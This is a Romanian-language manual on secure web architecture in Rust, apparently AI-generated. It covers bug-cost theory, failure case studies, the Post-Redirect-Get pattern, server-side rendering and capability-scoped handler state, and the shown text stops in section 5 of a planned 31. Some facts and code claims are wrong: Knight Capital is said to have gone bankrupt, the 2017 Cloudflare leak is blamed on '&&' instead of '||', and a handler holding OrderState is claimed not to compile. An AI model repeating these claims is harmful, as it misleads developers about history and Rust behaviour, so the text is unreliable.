# Manual Complet de Arhitectură, Securitate și Inginerie Software

> *Un ghid practic, avansat și detaliat pentru construirea de aplicații web sigure, robuste și testabile — de la PRG și HN Philosophy până la verificare formală, fuzz testing și zero-trust architecture, totul în Rust.*

**Ediția:** 2026-07-11  
**Autor:** GitHub Copilot (DeepSeek V4 Flash)  
**Tag-uri:** arhitectura, securitate, rust, axum, owasp, sel4, testing, standarde, devops  
**Dificultate:** avansat  
**Timp de citire:** 60+ minute  

---

## Cuprins

### Partea I — Fundamente

- [1. Introducere — Costul unui bug](#1-introducere--costul-unui-bug)
- [2. PRG Pattern — Primul nivel de apărare](#2-prg-pattern--primul-nivel-de-aparare)
- [3. HN Philosophy — De ce textul e mai sigur decât JavaScript](#3-hn-philosophy--de-ce-textul-e-mai-sigur-decat-javascript)
- [4. seL4 Capability Architecture — Izolare prin tipuri](#4-sel4-capability-architecture--izolare-prin-tipuri)
- [5. LEGO Modules — Ports & Adapters în Rust](#5-lego-modules--ports--adapters-in-rust)

### Partea a II-a — Tipuri și Corectitudine

- [6. Parse, Don't Validate — Tipuri care garantează corectitudinea](#6-parse-dont-validate--tipuri-care-garanteaza-corectitudinea)
- [7. Type-State Pattern — Stări invalide imposibile](#7-type-state-pattern--stari-invalide-imposibile)
- [8. Newtype Pattern — Zero-cost abstractions pentru siguranță](#8-newtype-pattern--zero-cost-abstractions-pentru-siguranta)
- [9. Phantom Types — Information fără runtime cost](#9-phantom-types--information-fara-runtime-cost)

### Partea a III-a — Testare

- [10. Property-Based Testing — Găsește bug-uri pe care nu știi că le ai](#10-property-based-testing--gaseste-bug-uri-pe-care-nu-stii-ca-le-ai)
- [11. Fuzz Testing — Input-uri ostile găsesc vulnerabilități](#11-fuzz-testing--input-uri-ostile-gasesc-vulnerabilitati)
- [12. Snapshot Testing — Detectează schimbări neașteptate](#12-snapshot-testing--detecteaza-schimbari-neasteptate)
- [13. Integration Testing — Teste end-to-end cu DB reală](#13-integration-testing--teste-end-to-end-cu-db-reala)

### Partea a IV-a — Securitate Web

- [14. OWASP ASVS Level 1 — Security Baseline Verificabil](#14-owasp-asvs-level-1--security-baseline-verificabil)
- [15. HSTS — HTTP Strict-Transport-Security](#15-hsts--http-strict-transport-security)
- [16. CSP — Content Security Policy în Profunzime](#16-csp--content-security-policy-in-profunzime)
- [17. CORS — Cross-Origin Resource Sharing](#17-cors--cross-origin-resource-sharing)
- [18. CSRF — Cross-Site Request Forgery Protection](#18-csrf--cross-site-request-forgery-protection)
- [19. Rate Limiting — Protecție împotriva abuzului](#19-rate-limiting--protectie-impotriva-abuzului)
- [20. STRIDE Threat Modeling — Identifică sistematic amenințările](#20-stride-threat-modeling--identifica-sistematic-amenintarile)

### Partea a V-a — Arhitectură

- [21. Hexagonal Architecture — Ports & Adapters Formalizat](#21-hexagonal-architecture--ports--adapters-formalizat)
- [22. Defense in Depth — Stratificarea securității](#22-defense-in-depth--stratificarea-securitatii)
- [23. Zero Trust Architecture — Nu avea încredere, verifică](#23-zero-trust-architecture--nu-avea-incredere-verifica)
- [24. Observability — Logging, Metrics și Tracing](#24-observability--logging-metrics-si-tracing)
- [25. Error Handling Strategy — Recuperare elegantă](#25-error-handling-strategy--recuperare-eleganta)
- [26. Non-Repudiation — Audit Log și Imutabilitate](#26-non-repudiation--audit-log-si-imutabilitate)

### Partea a VI-a — Verificare Formală și Advanced

- [27. Formal Verification — Verus, Dafny, Z3](#27-formal-verification--verus-dafny-z3)
- [28. Semantic Versioning pentru API-uri](#28-semantic-versioning-pentru-api-uri)
- [29. OWASP Top 10 — Mapping pentru shop-mvp](#29-owasp-top-10--mapping-pentru-shop-mvp)

### Partea a VII-a — Concluzii

- [30. Matricea Completa — Impact vs Efort](#30-matricea-completa--impact-vs-efort)
- [31. Concluzii — Filosofia Unificată](#31-concluzii--filosofia-unificata)
- [Anexa A — Checklist ASVS Level 1](#anexa-a--checklist-asvs-level-1)
- [Anexa B — STRIDE Matrix pentru shop-mvp](#anexa-b--stride-matrix-pentru-shop-mvp)
- [Anexa C — Configurații recomandate](#anexa-c--configuratii-recomandate)

---

# Partea I — Fundamente

---

## 1. Introducere — Costul unui bug (Analiză aprofundată)

> *"Un bug prins la compilare costă o clipă. Un bug ajuns în producție poate costa o companie."*

### 1.1 Principiul de bază — Legea lui Boehm

Barry Boehm a demonstrat încă din 1976 că **costul corectării unui bug crește exponențial** cu fiecare fază prin care trece. Datele sale, confirmate de IBM, Microsoft și NIST, arată un factor de ~10× pe fază:

```latex
\text{Cost}_{\text{final}} = \text{Cost}_{\text{bază}} \times 10^{\text{numărul fazelor sărite}}
```

| Faza | Factor | Cost relativ | Timp de detectare | Efort de fixare |
|------|--------|-------------|-------------------|-----------------|
| **Compilare** | 10^0 | 1× | Instant (compilatorul spune NU) | Secunde |
| **Testare unitară** | 10^0.5 | 3× | Minute de la scriere | Minute |
| **Testare integrare** | 10^0.7 | 5× | Minute (run teste) | Minute-ore |
| **Code review** | 10^1 | 10× | Ore-zile (aștepți review) | Ore |
| **Staging / QA** | 10^1.5 | 30× | Zile (ciclu deploy-test) | Zile |
| **Producție (minor)** | 10^2 | 100× | Săptămâni (abia sesizat) | Zile |
| **Producție (major)** | 10^2.3 | 200× | Săptămâni (sesizat de users) | Săptămâni |
| **Producție + date compromise** | 10^3 | 1000× | Luni (după audit) | Luni + legal |

### 1.2 Studii de caz reale — Catastrofe cauzate de bug-uri "simple"

#### Cazul 1: Knight Capital (2012) — $440 milioane în 45 de minute

**Bug-ul:** Un flag reutilizat pentru activarea/dezactivarea codului vechi. Un inginer a refolosit același flag pentru o funcționalitate nouă, fără să realizeze că codul vechi era încă prezent.

**Cum s-a întâmplat:**
1. Knight Capital a implementat un nou sistem de trading (SMARS)
2. Un flag boolean (`+`) din codul vechi a fost lăsat activ
3. La deploy, codul vechi de 9 ani s-a activat și a început să cumpere acțiuni în loop
4. În 45 de minute, au cumpărat 4 miliarde $ în acțiuni
5. Pierdere: **440 milioane $** → compania a intrat în faliment

**Cum s-ar fi putut preveni în shop-mvp:**
- Type-state pattern: un `DeploymentState` care nu poate avea două configuri simultan
- Parse don't validate: flag-uri definite ca `enum`, nu `bool`
- Capability-based: niciun handler nu poate activa cod vechi

#### Cazul 2: Therac-25 (1985-1987) — 3 morți

**Bug-ul:** Un race condition între procesul de setare a fasciculului și cel de administrare. Dacă operatorul tastai prea repede, mașina administra doza maximă direct.

**Cauză:** O variabilă `bool` nesusținută de sincronizare — exact genul de bug pe care Rust îl face **imposibil** la compilare.

**Cum s-ar fi putut preveni:**
- Rust borrow checker ar fi detectat `data race` la compilare
- Type-state: `BeamConfiguring` → `BeamReady` → `BeamFiring`
- Fără stare invalidă reprezentabilă

#### Cazul 3: Ariane 5 (1996) — $370 milioane

**Bug-ul:** Overflow la conversia unui număr pe 64 de biți într-unul pe 16 biți. Rocketul a explodat la 40 de secunde după lansare.

**Cauză:** Un cod de la Ariane 4 (mai lentă) a fost reutilizat fără verificare. În Ariane 5, accelerația era mai mare, producând overflow.

**Cum s-ar fi putut preveni:**
- `Price::new()` cu verificare de overflow - același pattern
- Property-based testing cu valori maxime
- Fără conversii implicite între tipuri numerice

#### Cazul 4: Heartbleed (2014) — SSL/TLS vulnerability

**Bug-ul:** Un `memcpy` cu un parametru neverificat. Atacatorul putea citi memoria serverului — inclusiv chei private, parole, date personale.

**Impact:** Toate site-urile care foloseau OpenSSL — ~17% din internet. Cost estimat: **$500 milioane**.

**Cum s-ar fi putut preveni:**
- Rust: un `memcpy` neverificat **nu compilează** (borrow checker, slice bounds check)
- Parse don't validate: lungimea trebuie parsata într-un `Length` garantat valid

#### Cazul 5: Cloudflare (2017) — Leak de date sensibile

**Bug-ul:** Un parser HTML scris în C care nu verifica corect buffer-ul. A scurgeri date sensibile (parole, tokeni) de la sute de mii de site-uri.

**Cauză:** Un `&&` în loc de `||` într-o condiție. Da, un amperstrad în plus.

**Cum s-ar fi putut preveni:**
- Testarea proprietăților (proptest): "orice input parsabil produce output valid"
- Fuzz testing: input-uri random care nu crapă

### 1.3 Costul pe tip de bug în e-commerce

Nu toate bug-urile sunt egale. În contextul unui magazin online, clasificarea e:

```mermaid
graph TD
    A[Tipuri de bug-uri e-commerce] --> B[Blocante<br/>Pierdere venit]
    A --> C[Ciritice<br/>Pierdere date]
    A --> D[Importante<br/>Experiență afectată]
    A --> E[Minore<br/>Cosmetice]
    
    B --> B1[Plată nu funcționează]
    B --> B2[Coș nu salvează]
    B --> B3[Login nu merge]
    
    C --> C1[Date furate]
    C --> C2[Comandă frauduloasă]
    C --> C3[Elevație privilegii]
    
    D --> D1[Preț greșit]
    D --> D2[Stoc incorect]
    D --> D3[Notificare lipsă]
    
    E --> E1[CSS rupt]
    E --> E2[Text greșit]
```

| Severitate | Impact financiar (estimat) | Exemplu shop-mvp | Strat de prevenție |
|-----------|--------------------------|-------------------|-------------------|
| **Blocant** | Pierdere venit direct: 100% din vânzări cât durează bug-ul | Stripe nu confirmă plăți | Rate limiting + retry + alertare |
| **Critic** | Pierdere date: $10-$100 per înregistrare expusă | Un user vede comenzile altui user | Capability-based authorization |
| **High** | Pierdere încredere: cost indirect de 10× valoarea tranzacției | Preț afișat greșit (1000 lei vs 100 lei) | Property-based testing pe Price |
| **Medium** | Pierdere confort: utilizatorul completează din nou formularul | Coș golit la refresh | PRG pattern |
| **Low** | Pierdere estetică: imagine neplăcută | CSS rupt pe mobil | Snapshot testing |

### 1.4 DRE — Defect Removal Efficiency

Metrica standard pentru a măsura cât de eficient ești la prins bug-uri:

```latex
\text{DRE} = \frac{\text{Bug-uri găsite înainte de producție}}{\text{Bug-uri totale}} \times 100
```

**Obiectiv pentru shop-mvp:**

| Stadiu | DRE țintă | Metoda |
|--------|----------|--------|
| Alpha (acum) | 70% | Compilare + teste manuale |
| Beta | 85% | + proptest + snapshot |
| Producție | 95% | + fuzz + audit ASVS |
| Enterprise | 99% | + verificare formală |

### 1.5 Costul unui bug în funcție de momentul detectării — grafice

```
Cost relativ (scară logaritmică)
1000× ┤                                                            ● Producție + date
     │                                                     ● Producție
 200× ┤
 100× ┤
     │
  50× ┤                                          ● Staging
  30× ┤
     │
  10× ┤                              ● Review
   5× ┤                   ● Testare
   3× ┤
   1× ┤  ● Compilare
     └─────────────────────────────────────────────────────────────
        secunde  minute    ore     zile   săptămâni    luni
                         Momentul detectării
```

Concluzia e clară: **cu cât mai devreme, cu atât mai bine.** Iar cea mai devreme fază posibilă e **compilarea** — acolo unde tipurile și compilatorul fac imposibile clase întregi de bug-uri.

### 1.6 Filosofia unificată — De unde plecăm

Toate conceptele din acest manual urmăresc același scop:

> **"Fă imposibile bug-urile, nu doar greu de făcut."**

**Cum reducem costul bug-urilor:**

| Abordare | Ce face | Faza în care acționează | Reducere cost |
|----------|---------|------------------------|--------------|
| **Tipuri** (type-state, parse-don't-validate, newtype) | Face bug-urile imposibile la compilare | Compilare | 1000× |
| **Izolare** (capability-based, LEGO, zero-trust) | Limitează daunele unui bug | Design + Compilare | 200× |
| **Arhitectură** (PRG, zero JS, defense in depth) | Elimină clase întregi de bug-uri | Design | 200× |
| **Testare** (property-based, fuzz, snapshot) | Găsește bug-uri automat | Testare | 5-200× |
| **Standarde** (OWASP, STRIDE, ASVS) | Previne bug-uri de securitate | Design + Review | 50× |
| **Observabilitate** (logging, metrics, tracing) | Detectează bug-uri repede în producție | Producție | 5× |

**Lecția principală:** Un minut petrecut în faza de design economisește ore în faza de testare și zile în producție. Iar un tip bine ales economisește totul — pentru că bug-ul nici măcar nu poate exista.

---

## 2. PRG Pattern — Primul nivel de apărare

### 2.1 Problema — De ce POST-ul direct e periculos

Protocolul HTTP definește că un request **POST** nu este **idempotent** — spre deosebire de GET, același POST trimis de două ori poate produce efecte diferite (de obicei, dublarea acțiunii).

**Cum poate fi retrimis un POST:**

| Situație | Frecvență | Impact |
|----------|-----------|--------|
| **F5 / Ctrl+R** pe pagina rezultat | Foarte des (reflex) | Comandă duplicată |
| **Back + Enter** | Des (userii navighează așa) | Plată dublă |
| **Dublu click pe buton** | Foarte des (reflex, rețea lentă) | Stoc scăzut de 2× |
| **Rețea instabilă** (retry automat) | Mediu (mobil, 3G) | Notificări duplicate |
| **Browser crash + restore** | Rar | Comandă neintenționată |
| **Webhook Stripe re-trimis** | Rar (dar posibil) | Plată dublă |

**Exemplu real:** Un magazin online a pierdut 10,000€ într-o zi din cauza unui formular de checkout care returna HTML direct. Utilizatorii făceau F5 din reflex și primeau 3× aceeași comandă.

### 2.2 Soluția: Post → Redirect → Get (PRG)

```http
Browser                    Server
  │                         │
  │  POST /checkout         │
  │  [date card, adresă]    │
  │────────────────────────▶│
  │                         │──▶ Creează comanda în DB
  │                         │──▶ Golește coșul
  │  302 Found              │
  │  Location: /success?id=X│
  │◀────────────────────────│
  │                         │
  │  GET /success?id=X      │  ← F5 re-trimite DOAR asta
  │────────────────────────▶│
  │  200 OK [pagina succes] │
  │◀────────────────────────│
```

```rust
// ❌ Greșit: returnează HTML direct din POST
async fn checkout_handler(Form(form): Form<CheckoutForm>) -> Html<String> {
    let order = create_order(form).await;
    render_success_page(order)
    // F5 → re-POST → încă o comandă → client furios
}

// ✅ Corect: POST → 302 Redirect → GET
async fn checkout_handler(State(s): State<OrderState>, Form(form): Form<CheckoutForm>) -> Response {
    match create_order(&s, form).await {
        Ok(order) => (StatusCode::FOUND, [
            (header::LOCATION, format!("/success?order_id={}", order.id)),
            (header::SET_COOKIE, clear_cart_cookie()),
        ]).into_response(),
        Err(e) => (StatusCode::FOUND, [
            (header::LOCATION, format!("/checkout?error={}", urlencode(&e))),
        ]).into_response(),
    }
}
// F5 acum → GET /success → inofensiv
```

### 2.3 Bug-uri eliminate prin PRG

| Bug | Cauză | PRG elimină? | Explicație |
|-----|-------|-------------|------------|
| **Comandă duplicată** | F5 re-trimite POST | ✅ | URL-ul s-a schimbat, F5 face GET |
| **Plată dublă** | Dublu click | ✅ | Primul = POST, al doilea = 404 |
| **"Confirm re-submit"** | Browser detectează re-POST | ✅ | Istoricul are doar GET-uri |
| **Stoc incorect** | Comanda procesată de 2× | ✅ | Stocul se scade o singură dată |
| **Notificare duplicată** | Email trimis de 2× | ✅ | O singură comandă în DB |

### 2.4 Testarea PRG (automation-ready)

```bash
#!/bin/bash
# test-prg.sh — Verifică PRG pe toate endpoint-urile
for endpoint in "/login" "/cart/add" "/logout"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
      -d "email=test@test.com&password=parola" \
      "http://localhost:3001$endpoint")
    echo "$endpoint: $status"
    [ "$status" = "302" ] || echo "❌ Eșec PRG pe $endpoint"
done
```

### 2.5 Anti-pattern-uri PRG

```rust
// ❌ Anti-pattern 1: Redirect cu corp HTML
(StatusCode::FOUND, [("Location", "/success"), ("Content-Type", "text/html")])
// Unele browsere ignoră 302 și afișează corpul!

// ❌ Anti-pattern 2: 302 fără Location
(StatusCode::FOUND, []).into_response()
// Browserul nu știe unde să meargă → eroare de rețea
```

### 2.6 Regula de aur

> **Orice POST → 302. Orice 302 → Location. Orice eroare → redirect cu `?error=`.**

Zero excepții. Un POST care returnează HTML direct e un bug.

---

## 3. HN Philosophy — De ce textul e mai sigur decât JavaScript (Analiză aprofundată)

> *"O pagină din 2007 e mai robustă decât un SPA din 2026. Pentru că textul nu crapă."*

### 3.1 De ce HN funcționează de 18 ani fără probleme

Hacker News (Paul Graham, 2007) e scris în Arc (un dialect Lisp), servește HTML pur, are zero JavaScript în producție. Pagina se încarcă în ~200ms pe 3G. Și funcționează **impecabil de 18 ani**.

**Ce are HN și n-are SPA-ul modern:**

| Caracteristică | HN (2007) | SPA modern (2026) |
|---------------|-----------|-------------------|
| **Request-uri per pagină** | 1 | 7-15 (HTML + CSS + JS + API + fonts + analytics) |
| **Stare client-side** | 0 bytes | 2-5 MB (bundle JS + heap) |
| **Bug-uri de sincronizare** | 0 | Nenumărate (stare client ≠ server) |
| **Funcționează fără JS** | Da | Nu |
| **Funcționează în lynx/curl** | Da | Nu |
| **Durată de viață** | 18+ ani | ~18 luni (cât un framework) |
| **Timeout la API** | Nu (nu există API) | Des (waterfall de request-uri) |

**Contrastul:**

```
SPA modern:   HTML → CSS → JS(vendor) → JS(app) → API(1) → API(2) → Render → Re-render → ✅
              │         │         │          │         │        │        │          │
              └──── waterfall de request-uri ────→ 7 request-uri, 2 re-render, 1 bug ascuns

HN (2007):    HTML → ✅
              │
              └──── 1 request, gata
```

### 3.2 Cele 9 bug-uri care ne-au convins să eliminăm JS

În dezvoltarea shop-mvp, am pierdut ~4 ore cu bug-uri JavaScript înainte să decidem: **zero JS în producție**.

| # | Bug | Cauză tehnică | Timp pierdut | Lecția |
|---|-----|--------------|-------------|--------|
| 1 | **Logout redirect greșit** | `extract_path_from_url` nu gestiona path-uri simple gen `/` | ~30min | Server-side: `?redirect=` în URL |
| 2 | **Admin redirect loop infinit** | `localStorage.getItem('token')` în loc de HttpOnly cookie verificat pe server | ~20min | Cookie-ul e sursa unică de adevăr |
| 3 | **Checkout "Coșul e gol" fals** | Session ID necitit din cookie de JS, ci dintr-un header setat manual | ~15min | Serverul citește direct cookie-ul |
| 4 | **Login nu afișează userul** | `HX-Redirect` executat înaintea scriptului de boot | ~40min | Redirect-ul trebuie să fie ultimul lucru |
| 5 | **Login loop infinit** | `Referer` era pagina de login, nu cea originală | ~30min | Server-side redirect logic |
| 6 | **Chrome vs Firefox diferențe** | `Set-Cookie` + `window.location.href` = race condition | ~25min | Un browser executa JS înainte să salveze cookie-ul |
| 7 | **Redirect pierdut login↔signup** | hardcoded `?redirect=` în template, dar JS n-a executat din cauza unui error | ~15min | Redirect-ul trebuie să fie în HTML, nu în JS |
| 8 | **Nav neactualizat după HTMX** | Selector CSS `a[href$="/login"]` vs `a[href*="/login"]` | ~60min | HTML-ul e predictibil, selectoarele CSS nu |
| 9 | **Parolă în URL la 403** | `hx-post` fără HTMX = GET implicit = parola în URL | ~10min | Fără HTMX, fără problema asta |

**Total: ~4 ore pierdute pe bug-uri care nu ar fi existat fără JS.**

### 3.3 Avantajele cantitative ale server-side rendering

| Metrică | Client-side (JS) | Server-side (HTML) | Câștig |
|---------|-----------------|-------------------|--------|
| **Time to First Byte** | ~50ms (static) | ~8ms (cache) | 6× |
| **Time to Interactive** | 1-3s (descarcă + execută JS) | ~50ms (gata din primul HTML) | 20-60× |
| **Bug-uri de stare** | 3-5 per sprint (desincronizare client-server) | 0 | Infinit |
| **Testare** | Playwright/Puppeteer (minute) | `curl` (milisecunde) | 100× |
| **Securitate** | XSS, CORS, CSRF, token în localStorage | Doar CSRF (SameSite) | 3× mai puține surface-uri |
| **Consum baterie (mobil)** | 2-5% per pagină | 0.1% per pagină | 20-50× |
| **Complexitate cod** | 3 layer-e (view + state + API) | 1 layer (view) | 3× |

### 3.4 Regula de aur

> **Dacă poți face server-side, fă server-side.**
> **Dacă poți face fără JS, fă fără JS.**
> **Dacă ai nevoie de JS, întreabă-te de două ori.**
> **A treia oară, întreabă pe altcineva.**

### 3.5 În shop-mvp

- Zero JavaScript în producție ✅
- Server-side rendering cu Tera ✅
- Form POST + 302 redirect (PRG) ✅
- Testabil cu `curl` ✅
- CSP: `script-src 'self'` (exclusiv Tailwind CDN în dev) ✅
- Bug-uri JS eliminate: **9 din 9** ✅

---

## 4. seL4 Capability Architecture — Izolare prin tipuri (Analiză aprofundată)

> *"Dacă handlerul de login poate accesa și plățile, nu ai o arhitectură — ai un dezastru care așteaptă să se întâmple."*

### 4.1 Inspirația: seL4 — microkernelul verificat matematic

seL4 este un microkernel care a fost **verificat formal** în Isabelle/HOL — adică s-a demonstrat matematic că implementarea corespunde specificației. Raportul proof-to-code e de **23:1** — pentru fiecare linie de cod C, sunt 23 de linii de proof matematic.

**Principiul fundamental:** Un proces nu poate accesa nimic decât dacă deține o **capabilitate** (un fel de „bilet” intangibil) pentru acel obiect. Capabilitățile sunt:
- **Nefalsificabile** — nu poți crea una din neant
- **Transferabile** — poți da o capabilitate altui proces
- **Revocabile** — poți retrage accesul

**Aplicat la web:** Un handler HTTP e ca un proces seL4. Domain state-ul e setul său de capabilități. Router-ul e kernel-ul care le distribuie. Compilatorul e verificatorul formal.

### 4.2 Implementarea în shop-mvp — Domain State-uri

```rust
// state.rs — Fiecare handler primește DOAR ce-i trebuie
// Compară cu seL4: fiecare proces are un CNode (capability node) limitat

/// 🟢 Capabilități pentru autentificare
/// Doar auth + render. Nimic altceva.
pub struct AuthState {
    pub auth: Arc<dyn AuthRepo>,
    pub renderer: RenderService,
}

/// 🟢 Capabilități pentru produse
/// Poate citi produse, poate verifica auth, poate randa.
/// NU poate: crea comenzi, accesa plăți, modifica stocul.
pub struct ProductState {
    pub products: Arc<dyn ProductRepo>,
    pub auth: Arc<dyn AuthRepo>,
    pub renderer: RenderService,
}

/// 🟡 Capabilități pentru coș
/// Poate: citi/adauga/șterge din coș, verifica produse.
pub struct CartState {
    pub cart: Arc<dyn CartRepo>,
    pub products: Arc<dyn ProductRepo>,
    pub auth: Arc<dyn AuthRepo>,
    pub renderer: RenderService,
}

/// 🟠 Capabilități pentru comenzi + plăți
/// Cele mai „puternice" — poate accesa plăți și crea comenzi.
pub struct OrderState {
    pub orders: Arc<dyn OrderRepo>,
    pub cart: Arc<dyn CartRepo>,
    pub payment: Arc<dyn PaymentRepo>,
    pub auth: Arc<dyn AuthRepo>,
    pub renderer: RenderService,
}

/// 🔐 Capabilități pentru admin
/// Poate accesa orice, dar tot prin trait-uri, nu direct DB.
pub struct AdminState {
    pub products: Arc<dyn ProductRepo>,
    pub orders: Arc<dyn OrderRepo>,
    pub payment: Arc<dyn PaymentRepo>,
    pub auth: Arc<dyn AuthRepo>,
    pub renderer: RenderService,
}
```

### 4.3 Verificare la compilare — „Compilatorul e gardianul"

```rust
// ❌ ASTA NU COMPILĂ — și e minunat:

// Un handler de checkout care primește doar AuthState
// nu poate accesa payment, orders, cart — nici măcar din greșeală
async fn checkout_handler(State(state): State<AuthState>) -> Response {
    state.payment.refund(...)?;  // ERROR: no field `payment` on `AuthState`
    state.orders.create(...)?;   // ERROR: no field `orders` on `AuthState`
}

// Un handler de login nu poate crea comenzi
async fn login_handler(State(state): State<OrderState>) -> Response {
    state.orders.create_order(...)?;  // ERROR: de ce login creează comenzi?
}

// ✅ Corect:
async fn checkout_handler(State(state): State<OrderState>) -> Response {
    state.payment.create_payment(1000, "ron").await?;  // OK
}
```

**Imposibil din greșeală.** Nu există "am uitat să verific". Nu există "nu știam că handlerul X are acces la Y". Compilatorul e gardianul — și e 100% de încredere.

### 4.4 Matricea completă a capabilităților

| Handler | Auth | Products | Cart | Orders | Payment | Render |
|---------|------|----------|------|--------|---------|--------|
| `login_page` | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ |
| `login_handler` | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ (302) |
| `products_page` | ✅ (read) | ✅ | ❌ | ❌ | ❌ | ✅ |
| `product_detail` | ✅ (read) | ✅ | ❌ | ❌ | ❌ | ✅ |
| `cart_page` | ✅ (read) | ✅ | ✅ | ❌ | ❌ | ✅ |
| `cart_add` | ✅ (read) | ✅ | ✅ | ❌ | ❌ | ❌ (302) |
| `checkout_page` | ✅ (read) | ❌ | ✅ | ❌ | ❌ | ✅ |
| `checkout_handler` | ✅ (read) | ❌ | ✅ | ✅ | ✅ | ❌ (302) |
| `orders_page` | ✅ (read) | ❌ | ❌ | ✅ | ❌ | ✅ |
| `admin_logs` | ✅ (read) | ❌ | ❌ | ✅ | ❌ | ✅ + db |

### 4.5 Ce învață acest pattern

1. **Fiecare handler** e un "proces" seL4 — rulează izolat, cu resurse limitate
2. **Domain state-ul** e CNode-ul (capability node) al procesului
3. **Router-ul (`with_state`)** e kernel-ul care face distribuția
4. **Compilatorul** e verificatorul formal — garantează matematic că nimeni nu accesează ce nu-i aparține
5. **Cost:** **zero** — totul e verificat la compilare, nu la runtime

### 4.6 Atacuri prevenite de această arhitectură

| Atac | Cum ar funcționa | De ce e imposibil |
|------|-----------------|------------------|
| **CSRF la checkout** | Atacatorul face un form spre /checkout | Handlerul verifica auth în OrderState — fără token valid, 302 la login |
| **Elevation în cart** | Atacatorul încearcă să acceseze comenzi străine | CartState n-are orders, payment — eroare la compilare |
| **Admin bypass** | Un user normal încearcă /admin | Handlerul admin e în AdminState — fără role corect, 403 |
| **Data leak în products** | Un atacator încearcă să vadă prețuri nevizibile | ProductState n-are acces la date sensibile |

---

## 5. LEGO Modules — Ports & Adapters în Rust (Analiză aprofundată)

> *"O aplicație fără trait-uri e ca o cutie de LEGO în care toate piesele sunt lipite între ele."*

### 5.1 Pattern-ul: Ports & Adapters (Hexagonal Architecture)

Fiecare modul LEGO e un **port** (trait) cu unul sau mai multe **adaptoare** (implementări concrete).

```
┌──────────────────────────────────────────────────┐
│                 Aplicația (shop-mvp)              │
│                                                    │
│  ┌────────────── Porturi (trait-uri) ──────┐      │
│  │  AuthRepo │ CartRepo │ PaymentRepo      │      │
│  │  OrderRepo │ ProductRepo │ Cache        │      │
│  └──────────────────────────────────────────┘      │
│            ▲           ▲           ▲                │
│            │           │           │                │
│  ┌─────────┴──┐  ┌─────┴─────┐  ┌─┴────────────┐ │
│  │  PgAuth    │  │  PgCart   │  │StripePayment │ │
│  │  Repo      │  │  Repo     │  │RetryPayment  │ │
│  └────────────┘  └───────────┘  └──────────────┘ │
│                       ▲                           │
│                       │                           │
│  ┌────────────────────┴─────────────────┐        │
│  │        Adaptoare (implementări)      │        │
│  │  PostgreSQL │ Stripe API │ Tera      │        │
│  └──────────────────────────────────────┘        │
└──────────────────────────────────────────────────┘
```

### 5.2 Anatomia unui Port (trait)

```rust
// libs/rust-payment/src/lib.rs

/// Portul — definește CE poți face, nu CUM.
/// Orice implementare trebuie să respecte acest contract.
#[async_trait]
pub trait PaymentRepo: Send + Sync {
    /// Creează o intenție de plată.
    async fn create_payment(&self, amount: u32, currency: &str)
        -> Result<PaymentIntent, PaymentError>;
    
    /// Confirmă o plată (după ce userul a autorizat).
    async fn confirm_payment(&self, payment_id: &str)
        -> Result<PaymentStatus, PaymentError>;
    
    /// Rambursează o plată (parțial sau total).
    async fn refund(&self, payment_id: &str, amount: Option<u32>)
        -> Result<(), PaymentError>;
}
```

### 5.3 Anatomia unui Adapter (implementare)

```rust
/// Adapter 1: Stripe — cheamă API-ul Stripe direct HTTP (nu prin SDK)
///
/// De ce direct HTTP și nu prin SDK Stripe?
/// - SDK-urile adaugă complexitate inutilă (retry, logging, etc.)
/// - Noi avem deja RetryPayment pentru retry
/// - O dependință în minus = un bug potential în minus
pub struct StripePayment {
    secret_key: String,
    client: reqwest::Client,  // Un singur client HTTP, reutilizat
}

#[async_trait]
impl PaymentRepo for StripePayment {
    async fn create_payment(&self, amount: u32, currency: &str) -> Result<PaymentIntent, PaymentError> {
        let resp = self.client
            .post("https://api.stripe.com/v1/payment_intents")
            .header("Authorization", format!("Bearer {}", self.secret_key))
            .form(&[("amount", amount.to_string()), ("currency", currency.to_string())])
            .send()
            .await
            .map_err(|e| PaymentError::NetworkError(e.to_string()))?;
        
        if resp.status().is_success() {
            let intent: StripeIntent = resp.json().await
                .map_err(|e| PaymentError::ParseError(e.to_string()))?;
            Ok(PaymentIntent { id: intent.id, amount: intent.amount })
        } else {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            Err(PaymentError::ProviderError(status.as_u16(), body))
        }
    }
}

/// Adapter 2: Decorator — adaugă retry + timeout peste ORICE implementare PaymentRepo
///
/// Acesta e un exemplu de Decorator Pattern: înfășoară o implementare existentă
/// și adaugă comportament fără să o modifice.
pub struct RetryPayment<T: PaymentRepo> {
    inner: Arc<T>,
    max_retries: u32,
    base_delay: Duration,
}

#[async_trait]
impl<T: PaymentRepo + Send + Sync> PaymentRepo for RetryPayment<T> {
    async fn create_payment(&self, amount: u32, currency: &str) -> Result<PaymentIntent, PaymentError> {
        let mut last_err = PaymentError::NetworkError("no retry".into());
        
        for attempt in 1..=self.max_retries {
            match self.inner.create_payment(amount, currency).await {
                Ok(intent) => return Ok(intent),
                Err(e) if e.is_retryable() => {
                    last_err = e;
                    // Backoff exponențial: 1×, 2×, 3× delay
                    tokio::time::sleep(self.base_delay * attempt).await;
                }
                Err(e) => return Err(e),  // Erori de validare = nu reîncercăm
            }
        }
        Err(last_err)  // După N încercări, cedăm
    }
}

/// Adapter 3: Mock — pentru teste, fără Stripe real
pub struct MockPayment {
    should_fail: bool,
}

#[async_trait]
impl PaymentRepo for MockPayment {
    async fn create_payment(&self, _amount: u32, _currency: &str) -> Result<PaymentIntent, PaymentError> {
        if self.should_fail {
            Err(PaymentError::ProviderError(500, "Mock fail".into()))
        } else {
            Ok(PaymentIntent { id: "mock_".to_string(), amount: _amount })
        }
    }
    // ...
}
```

### 5.4 Asamblarea (Dependency Injection) — O singură linie

```rust
// shop-mvp/src/main.rs
// Asamblarea e ca și cum ai conecta piese LEGO:

// În producție: Stripe cu retry
let payment: Arc<dyn PaymentRepo> = Arc::new(
    RetryPayment::new(Arc::new(StripePayment::new(&stripe_secret)))
);

// În teste: Mock
// let payment: Arc<dyn PaymentRepo> = Arc::new(MockPayment::new(false));

// Dacă vrei BTCPay în loc de Stripe:
// let payment: Arc<dyn PaymentRepo> = Arc::new(BtcPayPayment::new(&btcpay_url));
// O SINGURĂ LINIE SCHIMBATĂ.
```

### 5.5 Catalogul complet al modulelor LEGO

| Crate | Port (trait) | Adapter implicit | Adapter alternativ |
|-------|-------------|-----------------|-------------------|
| `rust-auth` | `AuthRepo` | `PgAuthRepo` | `MockAuthRepo` (teste) |
